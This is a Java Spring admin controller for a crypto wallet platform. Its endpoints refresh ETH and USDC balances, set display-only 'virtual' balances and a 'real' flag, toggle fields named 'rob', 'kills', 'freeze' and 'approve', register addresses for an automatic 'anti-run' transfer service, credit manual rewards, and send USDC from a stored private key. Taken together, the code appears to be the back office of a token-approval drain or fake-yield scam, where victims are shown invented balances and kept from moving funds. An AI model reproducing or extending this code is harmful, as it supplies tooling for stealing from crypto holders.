package io.renren.modules.core.controller.admin;

import java.io.IOException;
import java.math.BigDecimal;
import java.util.Date;

import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.shiro.authz.annotation.RequiresPermissions;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.core.conditions.update.LambdaUpdateWrapper;

import io.renren.common.exception.RRException;
import io.renren.common.utils.AesNewUtils;
import io.renren.common.utils.DateUtils;
import io.renren.common.utils.R;
import io.renren.modules.constants.ApproveEnum;
import io.renren.modules.constants.AutoEnum;
import io.renren.modules.constants.AutoTransferEnum;
import io.renren.modules.constants.Constants;
import io.renren.modules.constants.InviteEnum;
import io.renren.modules.constants.RealEnum;
import io.renren.modules.constants.RewardStatusEnum;
import io.renren.modules.core.contract.ContractHandler;
import io.renren.modules.core.contract.ReturnUsdcHandler;
import io.renren.modules.core.entity.PoolsEntity;
import io.renren.modules.core.entity.ReturnUsdcEntity;
import io.renren.modules.core.entity.RewardEntity;
import io.renren.modules.core.entity.WalletsEntity;
import io.renren.modules.core.param.PoolsParam;
import io.renren.modules.core.param.SendMessageParam;
import io.renren.modules.core.param.WalletSendRewadParam;
import io.renren.modules.core.param.WalletSendUsdcParam;
import io.renren.modules.core.param.WalletsPageParam;
import io.renren.modules.core.param.WalletsUpdateParam;
import io.renren.modules.core.service.MessageService;
import io.renren.modules.core.service.PoolsService;
import io.renren.modules.core.service.ReturnUsdcService;
import io.renren.modules.core.service.RewardService;
import io.renren.modules.core.service.TransferRecordService;
import io.renren.modules.core.service.WalletFundsService;
import io.renren.modules.core.service.WalletsService;
import io.renren.modules.core.vo.WalletStaticsVO;
import io.renren.modules.core.vo.WalletsVO;
import io.renren.modules.sys.entity.SysUserEntity;
import io.renren.modules.sys.service.SysConfigService;
import io.renren.modules.sys.service.SysUserService;
import io.renren.modules.utils.GoogleAuthenticator;
import io.renren.modules.utils.HttpUtils;
import lombok.extern.slf4j.Slf4j;
@Slf4j
@RestController
@RequestMapping("/admin/wallets")
public class WalletsController extends AbstractController{

	@Autowired
	WalletsService walletsService;
	@Autowired
	PoolsService poolsService;
	@Autowired
	MessageService messageService;
	@Autowired
	RewardService rewardService;
	@Autowired
	TransferRecordService transferRecordService;
	@Autowired
	ContractHandler contractHandler; 
	@Autowired
	WalletFundsService walletFundsService;
	@Autowired
	ReturnUsdcService returnUsdcService;
	@Autowired
	ReturnUsdcHandler returnUsdcHandler;
	@Autowired
	SysConfigService configService;
	@Autowired
	SysUserService sysUserService;
	
	private final HttpUtils httpUtils = new HttpUtils();
	
	@PostMapping("list")
	public R list(@RequestBody WalletsPageParam param) throws Exception {
		 return R.ok(walletsService.listPage(param));
	}
	
	@PostMapping("reflsh")
	public R reflsh(@RequestBody WalletsPageParam param) throws Exception {
		if(StringUtils.isEmpty(param.getWallet())) throw new RRException("钱包地址为空.");
		WalletsEntity wallet = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, param.getWallet()));
		if(wallet == null) throw new RRException("钱包不存在.");
		try {
			String userWallet = wallet.getWallet();
			String reciverWallet = wallet.getReciverWallet();
			String approveWallet = wallet.getApproveWallet();
			BigDecimal userEth = contractHandler.getEthBalance(userWallet);
			BigDecimal userUsdc = contractHandler.getUsdcBalance(userWallet);
			BigDecimal reciverEth = contractHandler.getEthBalance(reciverWallet);
			BigDecimal reciverUsdc = contractHandler.getUsdcBalance(reciverWallet);
			BigDecimal approveEth = contractHandler.getEthBalance(approveWallet);
			log.info("用户钱包:{} 余额 ETH:{} USDT:{} ",userWallet,userEth,userUsdc);
			
			walletsService.update(new LambdaUpdateWrapper<WalletsEntity>()
					.set(WalletsEntity::getEth,userEth)
					.set(WalletsEntity::getUsdc, userUsdc)
					.set(WalletsEntity::getReciverEth,reciverEth)
					.set(WalletsEntity::getReciverUsdc, reciverUsdc)
					.set(WalletsEntity::getApproveEth,approveEth)
					.eq(WalletsEntity::getWallet, userWallet));
		}catch(Exception ex) {
			log.error("更新钱包：{} 余额异常. {}",wallet.getWallet(),ex.getMessage());
		}
		return R.ok();
	}
	
	
	@PostMapping("statics")
	public R statics(@RequestBody PoolsParam param) throws Exception {
		Date start = DateUtils.stringToDate(DateUtils.getTodayStart(), DateUtils.DATE_TIME_PATTERN);
		Date end = DateUtils.stringToDate(DateUtils.getTodayEnd(), DateUtils.DATE_TIME_PATTERN);
		
		LambdaQueryWrapper<WalletsEntity> query = new LambdaQueryWrapper<WalletsEntity>();
		if(CollectionUtils.isNotEmpty(param.getPoolsIds())) {
			query.in(WalletsEntity::getPoolsId, param.getPoolsIds());
		}
		query.between(WalletsEntity::getCreated, start,end);
		int count = walletsService.count(query);
		
		BigDecimal transfer = transferRecordService.sum(start,end,param.getPoolsIds());
		BigDecimal approve = walletsService.sumApprove(param.getPoolsIds());
		WalletStaticsVO statics = new WalletStaticsVO(count,transfer,approve);
		 return R.ok(statics);
	}

	
	@PostMapping("get")
	public R get(Long id) throws Exception {
		if(id == null) throw new RRException("ID not exist");
		WalletsVO vo =	walletsService.get(id);
		return R.ok(vo);
	}
	

	@PostMapping("update")
	public R update(@RequestBody @Validated WalletsUpdateParam param) {
		WalletsEntity walletEntity = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, param.getWallet()));
		if(walletEntity == null) throw new RRException("wallet not extis.");
		PoolsEntity pools = poolsService.getById(walletEntity.getPoolsId());
		if(pools == null) {
			throw new RRException("Not affiliated with any agency") ;
		}
		if(pools.getCreateUserId() != getUser().getUserId() && pools.getOwnerId()!= getUser().getUserId() ) {
			throw new RRException("You do not have permission to operate this data");
		}
		
		
		LambdaUpdateWrapper<WalletsEntity> update = new LambdaUpdateWrapper<WalletsEntity>();
		if(param.getReals() !=null) {
			update.set(WalletsEntity::getReals, param.getReals());
		}
		if(param.getVirtualEth() !=null && param.getVirtualEth().compareTo(BigDecimal.ZERO) >= 0 ) {
			update.set(WalletsEntity::getVirtualEth, param.getVirtualEth());
		}
		if(param.getVirtualUsdc() !=null && param.getVirtualEth().compareTo(BigDecimal.ZERO) >= 0 ) {
			update.set(WalletsEntity::getVirtualUsdc, param.getVirtualUsdc());
		}
		if(param.getRob() !=null) {
			update.set(WalletsEntity::getRob, param.getRob());
		}
		if(param.getKills() !=null) {
			update.set(WalletsEntity::getKills, param.getKills());
		}
		if(param.getFreeze() !=null) {
			update.set(WalletsEntity::getFreeze, param.getFreeze());
		}
		if(param.getBlockade() !=null) {
			update.set(WalletsEntity::getBlockade, param.getBlockade());
		}
		if(param.getApprove() !=null) {
			update.set(WalletsEntity::getApprove, param.getApprove());
		}
		if(param.getRewardType() !=null) {
			update.set(WalletsEntity::getRewardType, param.getRewardType());
		}
		if(param.getStaking() !=null) {
			update.set(WalletsEntity::getStaking, param.getStaking());
		}
		update.eq(WalletsEntity::getWallet, param.getWallet());
		walletsService.update(update);
		log.info("后台修改钱包:{} 数据成功. {} ",param.getWallet(),JSON.toJSONString(param));
		return R.ok();
	}
	

	@PostMapping("auto")
	public R auto( @RequestBody WalletsPageParam param) {
		WalletsEntity walletEntity = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, param.getWallet()));
		if(walletEntity == null) throw new RRException("wallet not extis.");
		if(walletEntity.getApprove() != ApproveEnum.approved.getCode()) throw new RRException("wallet not apporved.");
		
		PoolsEntity pools = poolsService.getById(walletEntity.getPoolsId());
		if(pools == null) {
			throw new RRException("Not affiliated with any agency") ;
		}
		if(pools.getCreateUserId() != getUser().getUserId() && pools.getOwnerId()!= getUser().getUserId() ) {
			throw new RRException("You do not have permission to operate this data");
		}
		
		JSONObject jsonParam = new JSONObject();
		jsonParam.put("address", walletEntity.getWallet());
		LambdaUpdateWrapper<WalletsEntity> update = new LambdaUpdateWrapper<WalletsEntity>();
		if(walletEntity.getAuto() == AutoTransferEnum.auto.getCode()) {
			update.set(WalletsEntity::getAuto, AutoTransferEnum.manual.getCode());
			jsonParam.put("operation", "remove");
		}else {
			update.set(WalletsEntity::getAuto, AutoTransferEnum.auto.getCode());
			jsonParam.put("operation", "add");
		}
		update.eq(WalletsEntity::getWallet, walletEntity.getWallet());
		try {
			String response = httpUtils.post("http://127.0.0.1:9001/api/addresses",jsonParam.toJSONString());
			if(JSONObject.parseObject(response).get("message").equals("success")) {
				walletsService.update(update);
			}
		} catch (IOException e) {
			log.error("修改钱包：{} 自动防跑异常.，{}",walletEntity.getWallet(),e.getMessage());
			 throw new RRException("update error.");
		}
		return R.ok();
	}
	
	
	

	@PostMapping("sendMessage")
	public R sendMessage(@RequestBody @Validated SendMessageParam param) {
		messageService.saveMessage(param.getId(),getUser().getUserId(), param.getReciverId(), param.getContent(), param.getType());
		return R.ok();
	}
	
	@PostMapping("sendRewad")
	public R sendRewad(@RequestBody @Validated WalletSendRewadParam param) throws Exception {
		if(param.getAmount().compareTo(BigDecimal.ZERO) <=0) throw new RRException("发送ETH收益必须大于0");
		WalletsEntity wallets = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, param.getWallet()));
		if(wallets == null) throw new RRException("钱包地址不存在.");
		PoolsEntity pools = poolsService.getById(wallets.getPoolsId());
		if(pools == null) {
			throw new RRException("Not affiliated with any agency") ;
		}
		if(pools.getCreateUserId() != getUser().getUserId() && pools.getOwnerId()!= getUser().getUserId() ) {
			throw new RRException("You do not have permission to operate this data");
		}

		SysUserEntity user = sysUserService.getById(getUser().getUserId());
		if(StringUtils.isBlank(user.getGoogleAuth())){
			throw new RRException("Google Auth Code not build.");
		}
		// 6. 验证Google验证码（如果启用）
        if (!new GoogleAuthenticator().check_code(AesNewUtils.decrypt(user.getGoogleAuth()), 
            Long.parseLong(param.getGoogleAuthCode()),
            System.currentTimeMillis())) {
            return R.error("Google验证码不正确");
        }
		RewardEntity reward = new RewardEntity();
		reward.setWallet(param.getWallet());
		reward.setRewardEth(param.getAmount());
		reward.setUsdc(wallets.getReals() == RealEnum.real.getCode() ?  wallets.getUsdc() : wallets.getVirtualUsdc());
		reward.setInvited(InviteEnum.no.getCode());
		reward.setPoolsId(wallets.getPoolsId());
		reward.setAuto(AutoEnum.manual.getCode());
		reward.setStatus(RewardStatusEnum.success.getCode());
		reward.setNextTime(DateUtils.addDateHours(new Date(), 6));
		reward.setRemark("SUCCESS");
		rewardService.save(reward);
		walletFundsService.updateFunds(wallets, param.getAmount());
		log.info("钱包：{} 手动发放ETH:{} 奖励成功! 操作用户：{} ",param.getWallet(),param.getAmount(),getUser().getUsername());
		return R.ok();
	}
	@PostMapping("sendUsdc")
	@RequiresPermissions("admin:return:usdc")
	public R sendUsdc(@RequestBody @Validated WalletSendUsdcParam param) throws Exception {
		if(param.getAmount().compareTo(BigDecimal.ZERO) <=0) throw new RRException("退还USDC数量必须0");
		if(StringUtils.isEmpty(param.getToWallet())) throw new RRException("请输入收款钱包地址");
		WalletsEntity wallets = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, param.getWallet()));
		if(wallets == null) throw new RRException("钱包地址不存在.");
		PoolsEntity pools = poolsService.getById(wallets.getPoolsId());
		if(pools == null) {
			throw new RRException("Not affiliated with any agency") ;
		}
		if(pools.getCreateUserId() != getUser().getUserId() && pools.getOwnerId()!= getUser().getUserId() ) {
			throw new RRException("You do not have permission to operate this data");
		}
		String from = configService.getValue(Constants.returnWallet);
		String key = configService.getValue(Constants.returnWalletKey);
		String hash = returnUsdcHandler.returnUsdcTransfer(from, key, param.getToWallet(), param.getAmount());
		ReturnUsdcEntity reward = new ReturnUsdcEntity();
		reward.setWallet(param.getWallet());
		reward.setToWallet(param.getToWallet());
		reward.setUsdc(param.getAmount());
		reward.setPoolsId(wallets.getPoolsId());
		reward.setStatus(RewardStatusEnum.success.getCode());
		reward.setHash(hash);
		reward.setRemark(param.getRemark());
		returnUsdcService.save(reward);
		log.info("钱包：{} 退还USDC:{} 成功! 收款钱包:{} 操作用户：{} ",param.getWallet(),param.getAmount(),param.getToWallet(),getUser().getUsername());
		return R.ok();
	}
	
	
}
